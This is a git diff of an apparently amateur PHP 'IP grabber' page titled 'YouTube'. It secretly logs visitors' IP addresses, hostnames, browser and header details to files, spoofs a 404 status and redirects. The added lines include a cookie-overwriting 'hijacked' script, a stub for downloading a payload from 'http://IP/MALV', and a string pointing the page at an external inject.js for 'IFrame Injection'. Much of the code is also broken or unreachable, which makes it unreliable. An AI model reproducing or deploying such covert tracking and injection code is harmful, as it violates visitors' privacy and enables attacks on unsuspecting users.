@@ -1,55 +1,93 @@
 <?php
+
 $IP = $_SERVER['REMOTE_ADDR'];
 $proto = $_SERVER['SERVER_PROTOCOL']; 
 $BROWSER = $_SERVER['HTTP_USER_AGENT'];
-echo "<html> <head><title>YouTube</title><meta charset='utf-8'></head>";
-echo "<body background='https://images.pexels.com/photos/2583852/pexels-photo-2583852.jpeg'><script>console.log('Your IP has been logged. Enjoy it'); console.log('$BROWSER is your Browser');</script>";
+
 $Time = $_SERVER['REQUEST_TIME'];
 $SOFTWARE = $_SERVER['SERVER_SOFTWARE'];
 $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
-//$REQMETH = $_SERVER['REQUEST_METHOD'];
+$REQMETH = $_SERVER['REQUEST_METHOD'];
 $fh = fopen('log.txt', 'a');
+header("Location:  http://localhost/grabber.php");
+header('HTTP/1.0 404 Not Found');
 if(empty($fh)){
 fclose($fh);
 }
 for ($i = 0; $i <= $fh;$i++){
     fwrite($fh , $IP);
     fwrite($fh, "\n$proto");   
-    //fwrite($fh, "\t$REQMETH");
+    fwrite($fh, "\t$REQMETH");
 }
 fclose($fh);
 echo "<script>console.log( '$IP Is your IP address and your protocol: $proto');</script>";
 function dectorate(){
-  echo "<style>body{background-color:#24CC54;} .host-information{ background-color:#DD646E; } p{font-family: sans-serif; color: lightblue;} pre{color: green;}</style>";
+  echo "<style>body{background-color:#24CC54; } .host-information{ background-color:#DD646E; } p{font-family: sans-serif; color: lightblue;} pre{color: green;}</style>";
   echo "<script></script>";
 }
+
+
+
+echo "<html> <head><title>YouTube</title><meta charset='utf-8'></head>";
+echo "<body background= background.jpg><script>console.log('Your IP has been logged. Enjoy it'); console.log('$BROWSER is your Browser');</script>";
 dectorate();
+
+
+
 function Browser(){
     $BROWSER = $_SERVER['HTTP_USER_AGENT'];
     $fh = fopen("information.txt" ,"a");
     fwrite($fh, "\nBrowser information:\n ");
     fwrite($fh , $BROWSER);
     fclose($fh);
-    
-    echo "<script></script>";
+    echo "<script>g = document.location.url;document.location;gh = document.location.href;document.cookie = 'change_this_section_to_operate';console.log('Your cookie has been hijacked');</script>";
+echo "<style>h1{color: red;} body{font-family: Arial, 'Roberto'; font-size: 30px;};";
+
 }
+
+
+
+
 function Rev_DNS(){
+    try{
     $IP = $_SERVER['REMOTE_ADDR'];
+    
     $REV_HST = gethostbyaddr($IP);
     echo "<div class='host-information'><h3>Your hostname is $REV_HST\n</h3></div>";
-	echo "<pre>As well your browser and operating system have been logged within the server and in your console</pre>";
+	echo "<pre style='color=black;font-family:sans-serif;'>As well your browser and operating system have been logged within the server and in your console</pre>";
     $fh = fopen("information.txt" , "a");
-    fwrite($fh, "\nRemote Computer information:\n ");
-    fwrite($fh , $REV_HST);
+    fwrite($fh, "\nRemote Computer information:\t\r\n ");
+    fwrite($fh ,"\n$REV_HST\n");
+
+
+    //Protocols like POST/GET
+    $PROTO = $_SERVER['REQUEST_METHOD'];
+    fwrite($fh , "\nServer Protocol's operated\n");
+    fwrite($fh, "\nThe Protocol used: $PROTO");
     fclose($fh);
+    }
+    catch(Exception $e){
+echo "<pre style=font-color:red;>An error has occured:$e, however protocol's are saved</pre>";
+return 1;
+// do the protocol bit again
+$PROTO = $_SERVER['REQUEST_METHOD'];
+    fwrite($fh , "\nServer Protocol's operated\n");
+    fwrite($fh, "\nThe Protocol used: $PROTO");
+    fclose($fh);
+    }
 }
+
+
+
 Rev_DNS();
 Browser();
+
+
+
 function Get_Header(){
     try{
     $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
     $KCP = $_SERVER['HTTP_CONNECTION'];
-    $ENCODING = $_SERVER['HTTP_ACCEPT_ENCODING'];
     $language_used = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
 $fh = fopen("information.txt" ,"a");
 fwrite($fh, "\nHeader:\n");
@@ -58,34 +96,34 @@ fwrite($fh , $KCP);
 fclose($fh);
 $fe = fopen("additional_information.txt" ,"a");
 fwrite($fe, "\nThe additional information given is listed below\n");
-fwrite($fe, $ENCODING, 1);
-fwrite($fe, "\nAbove is the encoding used for the client.\n");
-fwrite($fe, "\nBelow Is the langauge that was used within the client browser.");
+fwrite($fe, "\nBelow Is the langauge that was used within the client browser\n\r");
 fwrite($fe , $language_used);
-echo "<script>document.write('<p>The language and encoding that you have is $ENCODING for encoding data and $language_used for your browser language;</p>'); console.log('The language used in your browser: $language_used and the encoding used: $ENCODING');</script>";
+fclose($fe);
     }
     catch(Exception $e){
         echo "$e has occurred.";
+        return 1;
     }
-
 };
+
+
+
 Get_Header();
+
     function Serv_Port(){
         $SERVER_PORT = $_SERVER['SERVER_PORT'];
         $SERVER_ACCPT_CONN = $_SERVER['REQUEST_METHOD'];
-
-        if ($_SERVER['GET']){
-
+        
+        
+       
+echo "<script> console.error('$SERVER_ACCPT_CONN');</script>";
         }
         
-        echo "<script>console.log('The Port you are connected to $SERVER_PORT');</script>";
-        //echo "<script>alert('your information has been stored.');</script>";
-
-    }
+    
 
 
-    Serv_Port();
-
+   
+/*
 function get_access(){
 	$SERVIP = $_SERVER['SERVER_ADDR'];
     echo "<script>console.log('The servers IP is $SERVIP and a remote conn has been made');</script>";
@@ -95,8 +133,12 @@ function get_access(){
         //system($commands." > NUL");
         
     }
+    if(strtoupper(substr(PHP_OS, 0 , 2)) == 'IOS')
 
-}
+}//fix above statements
+
+}*/
+//get_access();
 function gather_emails(){
     $IP = $_SERVER['REMOTE_ADDR'];
     $get_provider_DNS  = checkdnsrr($IP);
@@ -113,28 +155,37 @@ function spoof_serv_status(){
     $getservstatus = http_response_code(404);
     echo "<script>console.log($getservstatus);</script>";
     $hide_serv = file('server_status' , 'w'); //writes to file server status
+    fwrite($hide_serv, "$getservstatus");
+    fclose($hide_serv);
+   
 }
+
+function _Download_Attack_Vector(){
+
+    $URI = $_SERVER['http://IP/MALV']; // Change to payload later on
+    $C_MODIFIER = $_COOKIE[''];
+
+    // Work on this later at free time
+}
+spoof_serv_status(); //test out func
 gather_emails();
-function set_ckies(){
+function redird($uri){
     $IP = $_SERVER['REMOTE_ADDR'];
-$wrcokie = setcookie("yo" , "$IP");
-echo "<script>console.warn($wrcokie);</script>";
-echo "<script>console.error('Above are the amount of cookies in your session');</script>";
-}
-set_ckies();
-
-/*header("Content-Type: image/png");
-$ip = $_SERVER['REMOTE_ADDR'];  
-$im = @imagecreate(110, 20)
-    or die("Cannot Initialize new GD image stream");
-$background_color = imagecolorallocate($im, 0, 0, 0);
-$text_color = imagecolorallocate($im, 233, 14, 91);
-imagestring($im, 1, 5, 5,  "A example image made in php", $text_color);
-imagepng($im);
-imagedestroy($im);
-$fp = fopen('iplog.txt', 'a');
-fwrite($fp, $ip .'\n');  
+    try{
+        $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
+        $img_grabber = @imagecreatefromjpeg("https://resources.altium.com/sites/default/files/blogs/Semiconductor%20Fiber%20Could%20Replace%20Fiber%20Optic%20Cable%20Transmission%20Lines-37745.jpg");
+        echo "<iframe><script>d = document.location;cj=document.location.href;</script></iframe>";
+        
+    }
+    catch (Exception $e){
+        $fp = fopen('iplog.txt', 'a');
+fwrite($fp, "$IP" ,'\n');  
+fwrite($fp, $e + "Had occurred");
 fclose($fp);
+$val = "<script>document.location.url = 'http://www.cs-go.me/inject.js'; </script>";//Grabs IP through IFrame Injection
+echo "<h1> Your Ipv4 address has been logged no matter how hard you really tried.</h1>";
+    }
+}
+redird("http://localhost/test.php"); 
 
-*/ 
 ?>
